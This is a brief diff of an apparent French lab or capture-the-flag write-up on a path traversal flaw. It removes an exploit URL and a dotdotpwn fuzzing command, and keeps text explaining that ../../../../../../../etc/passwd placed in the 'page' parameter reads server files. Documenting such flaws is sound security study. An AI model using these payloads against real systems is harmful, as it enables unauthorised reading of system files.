@@ -1,6 +1,3 @@
-Path traversal : http://192.168.1.16/?page=../../../../../../../etc/passwd
-Using dotdotpwn : dotdotpwn.pl -m http-url http://host -u “http://host/?page=TRAVERSAL” -q -k “flag”
-
 Il y a une faille "Path Traversal" qui permet d'accéder à des fichiers du serveur.
 On peut l'exploiter en mettant ../../../../../../../etc/passwd dans le paramètre "page" de l'url
 
